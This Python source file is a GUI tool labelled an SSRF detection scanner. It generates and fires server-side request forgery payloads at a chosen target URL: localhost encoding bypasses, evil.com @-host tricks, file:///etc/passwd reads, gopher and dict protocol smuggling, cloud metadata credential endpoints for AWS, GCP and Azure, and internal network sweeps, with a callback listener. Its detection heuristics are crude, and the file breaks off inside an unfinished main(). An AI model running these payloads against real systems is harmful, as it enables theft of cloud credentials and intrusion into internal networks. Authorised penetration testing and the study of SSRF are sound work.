#!/usr/bin/env python3
"""
SSRF Detection Tool v1.0
For Authorized Security Testing Only
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import requests
import urllib.parse
import socket
import time
import json
import base64
import hashlib
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import ipaddress
import re
from collections import defaultdict
import queue

# ============================================================================
# LEGAL DISCLAIMER
# ============================================================================
DISCLAIMER = """
⚠️  LEGAL DISCLAIMER ⚠️

This tool is designed for AUTHORIZED security testing only.
Use only on systems you own or have explicit permission to test.

Unauthorized access to computer systems is illegal.
The developers assume no liability for misuse of this tool.

By using this tool, you agree to use it responsibly and legally.
"""

# ============================================================================
# PAYLOAD GENERATOR
# ============================================================================
class SSRFPayloadGenerator:
    def __init__(self, callback_host="", callback_port=8888):
        self.callback_host = callback_host
        self.callback_port = callback_port
        self.callback_url = f"http://{callback_host}:{callback_port}" if callback_host else ""

    def generate_token(self, target_url):
        """Generate unique tracking token"""
        timestamp = str(time.time())
        data = f"{target_url}{timestamp}"
        return hashlib.md5(data.encode()).hexdigest()[:12]

    def ip_variations(self, ip="127.0.0.1"):
        """Generate IP encoding variations"""
        variations = []

        # Standard formats
        variations.append(ip)

        # Decimal notation
        parts = ip.split('.')
        if len(parts) == 4:
            decimal = (int(parts[0]) << 24) + (int(parts[1]) << 16) + (int(parts[2]) << 8) + int(parts[3])
            variations.append(str(decimal))
            variations.append(f"0x{decimal:08x}")

        # Octal notation
        variations.append('.'.join([f"0{int(p):o}" for p in parts]))

        # Hex notation
        variations.append('0x' + ''.join([f"{int(p):02x}" for p in parts]))

        # Mixed encodings
        variations.append(f"{parts[0]}.{int(parts[1])}.0x{int(parts[2]):x}.0{int(parts[3]):o}")

        # IPv6 localhost variations
        if ip == "127.0.0.1":
            variations.extend([
                "::1",
                "0000::1",
                "::ffff:127.0.0.1",
                "::ffff:7f00:1"
            ])

        # Enclosed formats
        variations.extend([f"[{v}]" for v in variations if ':' in v])

        return list(set(variations))

    def url_bypass_variations(self, url):
        """Generate URL parser bypass variations"""
        variations = []
        parsed = urllib.parse.urlparse(url)
        base_url = url

        # Basic
        variations.append(base_url)

        # URL encoding
        variations.append(urllib.parse.quote(base_url, safe=''))
        variations.append(urllib.parse.quote(base_url, safe=':/'))

        # Double encoding
        variations.append(urllib.parse.quote(urllib.parse.quote(base_url, safe=''), safe=''))

        # Case variations
        variations.append(base_url.upper())
        variations.append(base_url.lower())

        # Null byte injection
        variations.append(base_url.replace('://', '://\\x00'))

        # CRLF injection
        variations.append(base_url.replace('://', '://%0d%0a'))

        # Backslash bypass
        variations.append(base_url.replace('/', '\\\\'))

        # @-based bypass
        if parsed.netloc:
            variations.append(f"<http://evil.com>@{parsed.netloc}{parsed.path}")
            variations.append(f"<http://evil.com>%00@{parsed.netloc}{parsed.path}")
            variations.append(f"<http://evil.com#@{parsed.netloc}{parsed.path}>")

        # Unicode/IDN bypass
        variations.append(base_url.replace('a', '\\u0061'))

        return variations

    def protocol_smuggling(self, target="127.0.0.1", port=22):
        """Generate protocol smuggling payloads"""
        payloads = []

        # File protocol
        payloads.extend([
            "file:///etc/passwd",
            "file:///etc/hosts",
            "file:///c:/windows/win.ini",
            "file://\\/\\/etc/passwd",
            "file:/etc/passwd"
        ])

        # Gopher protocol
        gopher_http = f"gopher://{target}:{port}/_GET / HTTP/1.1%0AHost: {target}%0A%0A"
        payloads.append(gopher_http)

        # Dict protocol
        payloads.append(f"dict://{target}:{port}/stat")

        # TFTP
        payloads.append(f"tftp://{target}/file")

        # LDAP
        payloads.append(f"ldap://{target}/dc=example,dc=com")

        # FTP
        payloads.append(f"ftp://{target}/")

        # SMB
        payloads.append(f"smb://{target}/share")

        return payloads

    def cloud_metadata_payloads(self):
        """Generate cloud metadata endpoint payloads"""
        payloads = []

        # AWS
        aws_endpoints = [
            "<http://169.254.169.254/latest/meta-data/>",
            "<http://169.254.169.254/latest/user-data/>",
            "<http://169.254.169.254/latest/meta-data/iam/security-credentials/>",
            "<http://169.254.169.254/latest/dynamic/instance-identity/>",
            "http://[::ffff:169.254.169.254]/latest/meta-data/",
            "<http://169.254.169.254.nip.io/latest/meta-data/>",
        ]
        payloads.extend(aws_endpoints)

        # GCP
        gcp_endpoints = [
            "<http://metadata.google.internal/computeMetadata/v1/>",
            "<http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token>",
            "<http://metadata/computeMetadata/v1/>",
            "<http://metadata.google.internal/computeMetadata/v1beta1/>"
        ]
        payloads.extend(gcp_endpoints)

        # Azure
        azure_endpoints = [
            "<http://169.254.169.254/metadata/instance?api-version=2021-02-01>",
            "<http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/>",
        ]
        payloads.extend(azure_endpoints)

        # DigitalOcean
        payloads.append("<http://169.254.169.254/metadata/v1/>")

        # Alibaba Cloud
        payloads.append("<http://100.100.100.200/latest/meta-data/>")

        # Oracle Cloud
        payloads.append("<http://169.254.169.254/opc/v1/instance/>")

        return payloads

    def internal_network_scan(self, base_ip="192.168.1", start=1, end=255, ports=[80, 443, 8080, 22, 3306]):
        """Generate internal network scanning payloads"""
        payloads = []

        for i in range(start, min(end + 1, start + 20)):  # Limit to 20 IPs
            ip = f"{base_ip}.{i}"
            for port in ports:
                payloads.append(f"http://{ip}:{port}/")

        # Common internal domains
        internal_domains = [
            "localhost", "127.0.0.1", "0.0.0.0",
            "192.168.1.1", "10.0.0.1", "172.16.0.1",
            "internal", "intranet", "admin", "dev", "test"
        ]

        for domain in internal_domains:
            for port in [80, 443, 8080]:
                payloads.append(f"http://{domain}:{port}/")

        return payloads

    def redirect_payloads(self, final_target):
        """Generate redirect-based SSRF payloads"""
        payloads = []

        # Short URLs (conceptual - would need actual shortener service)
        payloads.append(f"<http://bit.ly/redirect-to-{final_target}>")

        # Meta refresh
        payloads.append(f"data:text/html,<meta http-equiv='refresh' content='0;url={final_target}'>")

        # JavaScript redirect
        payloads.append(f"data:text/html,<script>location='{final_target}'</script>")

        return payloads

    def generate_all_payloads(self, target_type="basic"):
        """Generate comprehensive payload list based on type"""
        all_payloads = []

        if target_type == "basic":
            if self.callback_url:
                all_payloads.append(self.callback_url)
                all_payloads.extend(self.url_bypass_variations(self.callback_url))

        elif target_type == "localhost":
            for ip in self.ip_variations("127.0.0.1"):
                all_payloads.append(f"http://{ip}/")

        elif target_type == "cloud":
            all_payloads.extend(self.cloud_metadata_payloads())

        elif target_type == "protocol":
            all_payloads.extend(self.protocol_smuggling())

        elif target_type == "internal":
            all_payloads.extend(self.internal_network_scan())

        return all_payloads

# ============================================================================
# CALLBACK SERVER
# ============================================================================
class CallbackHandler(BaseHTTPRequestHandler):
    callbacks_received = []

    def log_message(self, format, *args):
        """Suppress default logging"""
        pass

    def do_GET(self):
        callback_data = {
            'timestamp': datetime.now().isoformat(),
            'method': 'GET',
            'path': self.path,
            'headers': dict(self.headers),
            'client_ip': self.client_address[0],
            'client_port': self.client_address[1]
        }
        CallbackHandler.callbacks_received.append(callback_data)

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"SSRF Detection - Callback Received")

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)

        callback_data = {
            'timestamp': datetime.now().isoformat(),
            'method': 'POST',
            'path': self.path,
            'headers': dict(self.headers),
            'body': post_data.decode('utf-8', errors='ignore'),
            'client_ip': self.client_address[0],
            'client_port': self.client_address[1]
        }
        CallbackHandler.callbacks_received.append(callback_data)

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"SSRF Detection - Callback Received")

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True

# ============================================================================
# SSRF SCANNER
# ============================================================================
class SSRFScanner:
    def __init__(self, callback):
        self.callback = callback
        self.results = []
        self.stop_flag = False

    def test_url(self, target_url, payload, method="GET", timeout=10):
        """Test single SSRF payload"""
        result = {
            'target': target_url,
            'payload': payload,
            'method': method,
            'timestamp': datetime.now().isoformat(),
            'vulnerable': False,
            'response_time': 0,
            'status_code': None,
            'error': None,
            'evidence': []
        }

        try:
            start_time = time.time()

            if method == "GET":
                # Test as URL parameter
                test_params = {
                    'url': payload,
                    'uri': payload,
                    'path': payload,
                    'dest': payload,
                    'redirect': payload,
                    'target': payload,
                    'file': payload,
                    'link': payload
                }

                for param, value in test_params.items():
                    if self.stop_flag:
                        break

                    try:
                        if '?' in target_url:
                            test_url = f"{target_url}&{param}={urllib.parse.quote(value)}"
                        else:
                            test_url = f"{target_url}?{param}={urllib.parse.quote(value)}"

                        response = requests.get(
                            test_url,
                            timeout=timeout,
                            allow_redirects=False,
                            verify=False
                        )

                        response_time = time.time() - start_time
                        result['response_time'] = response_time
                        result['status_code'] = response.status_code

                        # Detection heuristics
                        if self._analyze_response(response, payload, result):
                            result['vulnerable'] = True
                            break

                    except Exception as e:
                        continue

            elif method == "POST":
                # Test as POST body
                test_data = {
                    'url': payload,
                    'uri': payload,
                    'path': payload
                }

                response = requests.post(
                    target_url,
                    data=test_data,
                    timeout=timeout,
                    allow_redirects=False,
                    verify=False
                )

                response_time = time.time() - start_time
                result['response_time'] = response_time
                result['status_code'] = response.status_code

                if self._analyze_response(response, payload, result):
                    result['vulnerable'] = True

        except requests.exceptions.Timeout:
            result['error'] = "Timeout (possible blind SSRF)"
            result['vulnerable'] = True
            result['evidence'].append("Request timeout - possible blind SSRF")

        except Exception as e:
            result['error'] = str(e)

        return result

    def _analyze_response(self, response, payload, result):
        """Analyze response for SSRF indicators"""
        vulnerable = False

        # Check for cloud metadata indicators
        metadata_indicators = [
            'ami-id', 'instance-id', 'iam', 'security-credentials',
            'computeMetadata', 'access_token', 'token_type',
            'metadata', 'instance', 'oauth2'
        ]

        response_text = response.text.lower()
        for indicator in metadata_indicators:
            if indicator.lower() in response_text:
                result['evidence'].append(f"Cloud metadata indicator found: {indicator}")
                vulnerable = True

        # Check for file:// protocol success
        if 'file://' in payload.lower():
            file_indicators = ['root:', 'bin/bash', 'windows', 'program files']
            for indicator in file_indicators:
                if indicator.lower() in response_text:
                    result['evidence'].append(f"File protocol success: {indicator}")
                    vulnerable = True

        # Check for internal network indicators
        if any(ip in payload for ip in ['127.0.0.1', 'localhost', '192.168', '10.', '172.16']):
            internal_indicators = ['apache', 'nginx', 'iis', 'server', 'admin', 'dashboard']
            for indicator in internal_indicators:
                if indicator.lower() in response_text:
                    result['evidence'].append(f"Internal service detected: {indicator}")
                    vulnerable = True

        # Response time analysis for blind SSRF
        if result.get('response_time', 0) > 5:
            result['evidence'].append(f"Slow response time: {result['response_time']:.2f}s")
            vulnerable = True

        # Status code analysis
        if response.status_code in [200, 301, 302, 307]:
            if len(response.content) > 0:
                result['evidence'].append(f"Successful response with content ({len(response.content)} bytes)")

        # Header analysis
        suspicious_headers = ['X-Forwarded-For', 'X-Real-IP', 'Server']
        for header in suspicious_headers:
            if header in response.headers:
                result['evidence'].append(f"Header found: {header}: {response.headers[header]}")

        return vulnerable

    def scan(self, target_url, payloads, methods=["GET"], callback_func=None):
        """Perform comprehensive SSRF scan"""
        self.results = []
        self.stop_flag = False
        total = len(payloads) * len(methods)
        current = 0

        for payload in payloads:
            if self.stop_flag:
                break

            for method in methods:
                if self.stop_flag:
                    break

                current += 1

                if callback_func:
                    callback_func(f"Testing {current}/{total}: {payload[:50]}...", current, total)

                result = self.test_url(target_url, payload, method)
                self.results.append(result)

                if result['vulnerable']:
                    if callback_func:
                        callback_func(f"⚠ VULNERABLE: {payload[:50]}...", current, total)

                time.sleep(0.1)  # Rate limiting

        return self.results

    def stop(self):
        """Stop scanning"""
        self.stop_flag = True

# ============================================================================
# GUI APPLICATION
# ============================================================================
class SSRFDetectorGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SSRF Detection Tool v1.0")
        self.root.geometry("1400x900")

        # Hacker theme colors
        self.bg_color = "#0a0e27"
        self.fg_color = "#00ff41"
        self.accent_color = "#ff006e"
        self.secondary_color = "#1a1f3a"
        self.text_color = "#ffffff"

        self.root.configure(bg=self.bg_color)

        # Initialize components
        self.callback_server = None
        self.callback_thread = None
        self.scanner = SSRFScanner(self.log_message)
        self.scan_thread = None

        # Show disclaimer
        self.show_disclaimer()

        # Setup GUI
        self.setup_gui()

    def show_disclaimer(self):
        """Show legal disclaimer"""
        response = messagebox.askokcancel(
            "Legal Disclaimer",
            DISCLAIMER + "\\n\\nDo you agree to use this tool responsibly?",
            icon='warning'
        )
        if not response:
            self.root.destroy()
            exit()

    def setup_gui(self):
        """Setup GUI components"""
        # Style configuration
        style = ttk.Style()
        style.theme_use('clam')

        style.configure('Hacker.TFrame', background=self.bg_color)
        style.configure('Hacker.TLabel', background=self.bg_color, foreground=self.fg_color, font=('Consolas', 10))
        style.configure('Hacker.TButton', background=self.secondary_color, foreground=self.fg_color, font=('Consolas', 10, 'bold'))
        style.configure('Hacker.TEntry', fieldbackground=self.secondary_color, foreground=self.text_color)

        # Title
        title_frame = tk.Frame(self.root, bg=self.bg_color)
        title_frame.pack(fill=tk.X, padx=10, pady=10)

        title_label = tk.Label(
            title_frame,
            text="⚡ SSRF DETECTION TOOL ⚡",
            font=('Consolas', 24, 'bold'),
            bg=self.bg_color,
            fg=self.accent_color
        )
        title_label.pack()

        subtitle = tk.Label(
            title_frame,
            text="Server-Side Request Forgery Vulnerability Scanner",
            font=('Consolas', 10),
            bg=self.bg_color,
            fg=self.fg_color
        )
        subtitle.pack()

        # Main container
        main_container = tk.Frame(self.root, bg=self.bg_color)
        main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # Left panel - Configuration
        left_panel = tk.Frame(main_container, bg=self.secondary_color, relief=tk.RIDGE, bd=2)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))

        self.setup_config_panel(left_panel)

        # Right panel - Results
        right_panel = tk.Frame(main_container, bg=self.secondary_color, relief=tk.RIDGE, bd=2)
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))

        self.setup_results_panel(right_panel)

        # Bottom panel - Status
        self.setup_status_panel()

    def setup_config_panel(self, parent):
        """Setup configuration panel"""
        # Header
        header = tk.Label(
            parent,
            text="⚙ CONFIGURATION",
            font=('Consolas', 14, 'bold'),
            bg=self.secondary_color,
            fg=self.accent_color
        )
        header.pack(pady=10)

        # Target URL
        tk.Label(
            parent,
            text="Target URL:",
            bg=self.secondary_color,
            fg=self.fg_color,
            font=('Consolas', 10, 'bold')
        ).pack(anchor=tk.W, padx=10, pady=(10, 0))

        self.target_url = tk.Entry(parent, bg=self.bg_color, fg=self.text_color, font=('Consolas', 10), insertbackground=self.fg_color)
        self.target_url.pack(fill=tk.X, padx=10, pady=5)
        self.target_url.insert(0, "<https://example.com/api/fetch>")

        # Callback Server Section
        callback_frame = tk.LabelFrame(
            parent,
            text=" Callback Server ",
            bg=self.secondary_color,
            fg=self.fg_color,
            font=('Consolas', 10, 'bold')
        )
        callback_frame.pack(fill=tk.X, padx=10, pady=10)

        tk.Label(
            callback_frame,
            text="Your Server IP/Domain:",
            bg=self.secondary_color,
            fg=self.fg_color
        ).grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)

        self.callback_host = tk.Entry(callback_frame, bg=self.bg_color, fg=self.text_color, font=('Consolas', 10))
        self.callback_host.grid(row=0, column=1, sticky=tk.EW, padx=5, pady=5)

        try:
            # Try to get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            self.callback_host.insert(0, local_ip)
        except:
            self.callback_host.insert(0, "127.0.0.1")

        tk.Label(
            callback_frame,
            text="Port:",
            bg=self.secondary_color,
            fg=self.fg_color
        ).grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)

        self.callback_port = tk.Entry(callback_frame, bg=self.bg_color, fg=self.text_color, font=('Consolas', 10))
        self.callback_port.grid(row=1, column=1, sticky=tk.EW, padx=5, pady=5)
        self.callback_port.insert(0, "8888")

        callback_frame.columnconfigure(1, weight=1)

        # Server control buttons
        server_btn_frame = tk.Frame(callback_frame, bg=self.secondary_color)
        server_btn_frame.grid(row=2, column=0, columnspan=2, pady=5)

        self.start_server_btn = tk.Button(
            server_btn_frame,
            text="▶ Start Server",
            bg=self.bg_color,
            fg=self.fg_color,
            font=('Consolas', 9, 'bold'),
            command=self.start_callback_server,
            cursor="hand2"
        )
        self.start_server_btn.pack(side=tk.LEFT, padx=5)

        self.stop_server_btn = tk.Button(
            server_btn_frame,
            text="⏹ Stop Server",
            bg=self.bg_color,
            fg=self.accent_color,
            font=('Consolas', 9, 'bold'),
            command=self.stop_callback_server,
            state=tk.DISABLED,
            cursor="hand2"
        )
        self.stop_server_btn.pack(side=tk.LEFT, padx=5)

        # Payload Type Selection
        payload_frame = tk.LabelFrame(
            parent,
            text=" Attack Vectors ",
            bg=self.secondary_color,
            fg=self.fg_color,
            font=('Consolas', 10, 'bold')
        )
        payload_frame.pack(fill=tk.X, padx=10, pady=10)

        self.payload_vars = {}
        payload_types = [
            ("Basic SSRF (Callback)", "basic"),
            ("Localhost/127.0.0.1", "localhost"),
            ("Cloud Metadata", "cloud"),
            ("Protocol Smuggling", "protocol"),
            ("Internal Network", "internal")
        ]

        for text, value in payload_types:
            var = tk.BooleanVar(value=True)
            self.payload_vars[value] = var
            tk.Checkbutton(
                payload_frame,
                text=text,
                variable=var,
                bg=self.secondary_color,
                fg=self.fg_color,
                selectcolor=self.bg_color,
                font=('Consolas', 9)
            ).pack(anchor=tk.W, padx=10, pady=2)

        # HTTP Methods
        method_frame = tk.LabelFrame(
            parent,
            text=" HTTP Methods ",
            bg=self.secondary_color,
            fg=self.fg_color,
            font=('Consolas', 10, 'bold')
        )
        method_frame.pack(fill=tk.X, padx=10, pady=10)

        self.method_get = tk.BooleanVar(value=True)
        self.method_post = tk.BooleanVar(value=True)

        tk.Checkbutton(
            method_frame,
            text="GET",
            variable=self.method_get,
            bg=self.secondary_color,
            fg=self.fg_color,
            selectcolor=self.bg_color,
            font=('Consolas', 9)
        ).pack(anchor=tk.W, padx=10, pady=2)

        tk.Checkbutton(
            method_frame,
            text="POST",
            variable=self.method_post,
            bg=self.secondary_color,
            fg=self.fg_color,
            selectcolor=self.bg_color,
            font=('Consolas', 9)
        ).pack(anchor=tk.W, padx=10, pady=2)

        # Scan Controls
        control_frame = tk.Frame(parent, bg=self.secondary_color)
        control_frame.pack(fill=tk.X, padx=10, pady=20)

        self.scan_btn = tk.Button(
            control_frame,
            text="🚀 START SCAN",
            bg=self.accent_color,
            fg=self.text_color,
            font=('Consolas', 12, 'bold'),
            command=self.start_scan,
            height=2,
            cursor="hand2"
        )
        self.scan_btn.pack(fill=tk.X, pady=5)

        self.stop_btn = tk.Button(
            control_frame,
            text="⏹ STOP SCAN",
            bg=self.bg_color,
            fg=self.accent_color,
            font=('Consolas', 10, 'bold'),
            command=self.stop_scan,
            state=tk.DISABLED,
            cursor="hand2"
        )
        self.stop_btn.pack(fill=tk.X, pady=5)

        # Progress bar
        self.progress = ttk.Progressbar(parent, mode='determinate')
        self.progress.pack(fill=tk.X, padx=10, pady=10)

    def setup_results_panel(self, parent):
        """Setup results panel"""
        # Header
        header = tk.Label(
            parent,
            text="📊 RESULTS & LOGS",
            font=('Consolas', 14, 'bold'),
            bg=self.secondary_color,
            fg=self.accent_color
        )
        header.pack(pady=10)

        # Notebook for tabs
        notebook = ttk.Notebook(parent)
        notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # Scan Results Tab
        results_tab = tk.Frame(notebook, bg=self.bg_color)
        notebook.add(results_tab, text="Scan Results")

        self.results_text = scrolledtext.ScrolledText(
            results_tab,
            bg=self.bg_color,
            fg=self.fg_color,
            font=('Consolas', 9),
            insertbackground=self.fg_color
        )
        self.results_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Callbacks Tab
        callbacks_tab = tk.Frame(notebook, bg=self.bg_color)
        notebook.add(callbacks_tab, text="Callbacks")

        self.callbacks_text = scrolledtext.ScrolledText(
            callbacks_tab,
            bg=self.bg_color,
            fg=self.accent_color,
            font=('Consolas', 9),
            insertbackground=self.fg_color
        )
        self.callbacks_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Payloads Tab
        payloads_tab = tk.Frame(notebook, bg=self.bg_color)
        notebook.add(payloads_tab, text="Payloads")

        self.payloads_text = scrolledtext.ScrolledText(
            payloads_tab,
            bg=self.bg_color,
            fg="#00d4ff",
            font=('Consolas', 9),
            insertbackground=self.fg_color
        )
        self.payloads_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Export buttons
        export_frame = tk.Frame(parent, bg=self.secondary_color)
        export_frame.pack(fill=tk.X, padx=10, pady=10)

        tk.Button(
            export_frame,
            text="📄 Export Results",
            bg=self.bg_color,
            fg=self.fg_color,
            font=('Consolas', 9),
            command=self.export_results,
            cursor="hand2"
        ).pack(side=tk.LEFT, padx=5)

        tk.Button(
            export_frame,
            text="🗑 Clear Logs",
            bg=self.bg_color,
            fg=self.accent_color,
            font=('Consolas', 9),
            command=self.clear_logs,
            cursor="hand2"
        ).pack(side=tk.LEFT, padx=5)

    def setup_status_panel(self):
        """Setup status bar"""
        status_frame = tk.Frame(self.root, bg=self.secondary_color, relief=tk.SUNKEN, bd=1)
        status_frame.pack(side=tk.BOTTOM, fill=tk.X)

        self.status_label = tk.Label(
            status_frame,
            text="Ready",
            bg=self.secondary_color,
            fg=self.fg_color,
            font=('Consolas', 9),
            anchor=tk.W
        )
        self.status_label.pack(side=tk.LEFT, padx=10, pady=5)

        self.vuln_count_label = tk.Label(
            status_frame,
            text="Vulnerabilities: 0",
            bg=self.secondary_color,
            fg=self.accent_color,
            font=('Consolas', 9, 'bold'),
            anchor=tk.E
        )
        self.vuln_count_label.pack(side=tk.RIGHT, padx=10, pady=5)

    def log_message(self, message, level="INFO"):
        """Log message to results"""
        timestamp = datetime.now().strftime("%H:%M:%S")

        colors = {
            "INFO": self.fg_color,
            "SUCCESS": "#00ff00",
            "WARNING": "#ffaa00",
            "ERROR": self.accent_color,
            "VULN": "#ff0000"
        }

        color = colors.get(level, self.fg_color)

        self.results_text.insert(tk.END, f"[{timestamp}] ", "timestamp")
        self.results_text.insert(tk.END, f"[{level}] ", level)
        self.results_text.insert(tk.END, f"{message}\\n")

        self.results_text.tag_config("timestamp", foreground="#888888")
        self.results_text.tag_config(level, foreground=color, font=('Consolas', 9, 'bold'))

        self.results_text.see(tk.END)
        self.root.update_idletasks()

    def start_callback_server(self):
        """Start callback server"""
        try:
            port = int(self.callback_port.get())
            host = self.callback_host.get()

            CallbackHandler.callbacks_received = []

            self.callback_server = ThreadedHTTPServer(('0.0.0.0', port), CallbackHandler)
            self.callback_thread = threading.Thread(target=self.callback_server.serve_forever, daemon=True)
            self.callback_thread.start()

            self.log_message(f"Callback server started on {host}:{port}", "SUCCESS")
            self.status_label.config(text=f"Server running on {host}:{port}")

            self.start_server_btn.config(state=tk.DISABLED)
            self.stop_server_btn.config(state=tk.NORMAL)

            # Start callback monitor
            self.monitor_callbacks()

        except Exception as e:
            self.log_message(f"Failed to start server: {str(e)}", "ERROR")
            messagebox.showerror("Error", f"Failed to start callback server:\\n{str(e)}")

    def stop_callback_server(self):
        """Stop callback server"""
        if self.callback_server:
            self.callback_server.shutdown()
            self.callback_server = None
            self.log_message("Callback server stopped", "INFO")
            self.status_label.config(text="Server stopped")

            self.start_server_btn.config(state=tk.NORMAL)
            self.stop_server_btn.config(state=tk.DISABLED)

    def monitor_callbacks(self):
        """Monitor for incoming callbacks"""
        if self.callback_server and hasattr(CallbackHandler, 'callbacks_received'):
            if CallbackHandler.callbacks_received:
                for callback in CallbackHandler.callbacks_received:
                    self.callbacks_text.insert(tk.END, "=" * 80 + "\\n")
                    self.callbacks_text.insert(tk.END, f"🎯 CALLBACK RECEIVED!\\n", "alert")
                    self.callbacks_text.insert(tk.END, f"Time: {callback['timestamp']}\\n")
                    self.callbacks_text.insert(tk.END, f"From: {callback['client_ip']}:{callback['client_port']}\\n")
                    self.callbacks_text.insert(tk.END, f"Method: {callback['method']}\\n")
                    self.callbacks_text.insert(tk.END, f"Path: {callback['path']}\\n")
                    self.callbacks_text.insert(tk.END, f"Headers:\\n")
                    for k, v in callback['headers'].items():
                        self.callbacks_text.insert(tk.END, f"  {k}: {v}\\n")
                    if 'body' in callback:
                        self.callbacks_text.insert(tk.END, f"Body: {callback['body']}\\n")
                    self.callbacks_text.insert(tk.END, "\\n")
                    self.callbacks_text.see(tk.END)

                    self.log_message(f"Callback received from {callback['client_ip']}", "VULN")

                CallbackHandler.callbacks_received = []

        if self.callback_server:
            self.root.after(1000, self.monitor_callbacks)

    def generate_payloads(self):
        """Generate payloads based on selected options"""
        host = self.callback_host.get()
        port = self.callback_port.get()

        generator = SSRFPayloadGenerator(host, port)
        all_payloads = []

        for payload_type, var in self.payload_vars.items():
            if var.get():
                payloads = generator.generate_all_payloads(payload_type)
                all_payloads.extend(payloads)
                self.log_message(f"Generated {len(payloads)} payloads for {payload_type}", "INFO")

        # Display payloads
        self.payloads_text.delete(1.0, tk.END)
        self.payloads_text.insert(tk.END, f"Total Payloads: {len(all_payloads)}\\n")
        self.payloads_text.insert(tk.END, "=" * 80 + "\\n\\n")

        for i, payload in enumerate(all_payloads, 1):
            self.payloads_text.insert(tk.END, f"{i}. {payload}\\n")

        return all_payloads

    def start_scan(self):
        """Start SSRF scan"""
        target = self.target_url.get().strip()

        if not target:
            messagebox.showwarning("Warning", "Please enter a target URL")
            return

        # Generate payloads
        payloads = self.generate_payloads()

        if not payloads:
            messagebox.showwarning("Warning", "No payload types selected")
            return

        # Get methods
        methods = []
        if self.method_get.get():
            methods.append("GET")
        if self.method_post.get():
            methods.append("POST")

        if not methods:
            messagebox.showwarning("Warning", "Please select at least one HTTP method")
            return

        # Update UI
        self.scan_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.progress['value'] = 0

        self.log_message(f"Starting scan on {target}", "INFO")
        self.log_message(f"Payloads: {len(payloads)}, Methods: {', '.join(methods)}", "INFO")

        # Start scan in thread
        self.scan_thread = threading.Thread(
            target=self._run_scan,
            args=(target, payloads, methods),
            daemon=True
        )
        self.scan_thread.start()

    def _run_scan(self, target, payloads, methods):
        """Run scan in background thread"""
        def update_progress(message, current, total):
            progress_percent = (current / total) * 100
            self.progress['value'] = progress_percent
            self.status_label.config(text=message)
            self.root.update_idletasks()

        results = self.scanner.scan(target, payloads, methods, update_progress)

        # Process results
        vulnerable_count = 0

        self.results_text.insert(tk.END, "\\n" + "=" * 80 + "\\n")
        self.results_text.insert(tk.END, "SCAN COMPLETE\\n", "header")
        self.results_text.insert(tk.END, "=" * 80 + "\\n\\n")

        for result in results:
            if result['vulnerable']:
                vulnerable_count += 1
                self.results_text.insert(tk.END, "🚨 VULNERABILITY FOUND!\\n", "vuln")
                self.results_text.insert(tk.END, f"Target: {result['target']}\\n")
                self.results_text.insert(tk.END, f"Payload: {result['payload']}\\n")
                self.results_text.insert(tk.END, f"Method: {result['method']}\\n")
                self.results_text.insert(tk.END, f"Status: {result['status_code']}\\n")
                self.results_text.insert(tk.END, f"Response Time: {result['response_time']:.2f}s\\n")
                self.results_text.insert(tk.END, "Evidence:\\n")
                for evidence in result['evidence']:
                    self.results_text.insert(tk.END, f"  - {evidence}\\n")
                self.results_text.insert(tk.END, "\\n")

        self.results_text.tag_config("header", foreground=self.accent_color, font=('Consolas', 12, 'bold'))
        self.results_text.tag_config("vuln", foreground="#ff0000", font=('Consolas', 10, 'bold'))

        # Update UI
        self.vuln_count_label.config(text=f"Vulnerabilities: {vulnerable_count}")
        self.log_message(f"Scan complete. Found {vulnerable_count} potential vulnerabilities", "SUCCESS")
        self.status_label.config(text="Scan complete")

        self.scan_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.progress['value'] = 100

    def stop_scan(self):
        """Stop current scan"""
        self.scanner.stop()
        self.log_message("Scan stopped by user", "WARNING")
        self.scan_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)

    def export_results(self):
        """Export results to file"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("JSON files", "*.json"), ("All files", "*.*")]
        )

        if filename:
            try:
                with open(filename, 'w') as f:
                    if filename.endswith('.json'):
                        json.dump(self.scanner.results, f, indent=2)
                    else:
                        f.write("SSRF DETECTION TOOL - RESULTS\\n")
                        f.write("=" * 80 + "\\n\\n")
                        f.write(self.results_text.get(1.0, tk.END))
                        f.write("\\n\\nCALLBACKS\\n")
                        f.write("=" * 80 + "\\n\\n")
                        f.write(self.callbacks_text.get(1.0, tk.END))

                self.log_message(f"Results exported to {filename}", "SUCCESS")
                messagebox.showinfo("Success", f"Results exported to {filename}")

            except Exception as e:
                self.log_message(f"Export failed: {str(e)}", "ERROR")
                messagebox.showerror("Error", f"Failed to export results:\\n{str(e)}")

    def clear_logs(self):
        """Clear all logs"""
        response = messagebox.askyesno("Confirm", "Clear all logs and results?")
        if response:
            self.results_text.delete(1.0, tk.END)
            self.callbacks_text.delete(1.0, tk.END)
            self.payloads_text.delete(1.0, tk.END)
            self.scanner.results = []
            self.vuln_count_label.config(text="Vulnerabilities: 0")
            self.log_message("Logs cleared", "INFO")

# ============================================================================
# MAIN
# ============================================================================
def main():
    import warnings
    warnings.filterwarnings("ignore", category=DeprecationWarning)
